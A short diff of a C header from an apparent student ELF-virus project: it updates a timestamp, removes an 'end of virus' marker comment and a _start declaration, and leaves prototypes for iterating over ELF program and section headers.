@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
-/*   Updated: 2020/01/12 17:51:18 by ichkamo          ###   ########.fr       */
+/*   Updated: 2020/01/12 18:56:05 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -73,11 +73,5 @@ typedef	bool	(*f_iter_callback)(struct safe_ptr ref, size_t offset, void *data);
 
 bool		foreach_phdr(struct safe_ptr ref, f_iter_callback callback, void *data);
 bool		foreach_shdr(struct safe_ptr ref, f_iter_callback callback, void *data);
-
-/*
-** end of virus (cf Makefile)
-*/
-
-void		_start(void);
 
 #endif
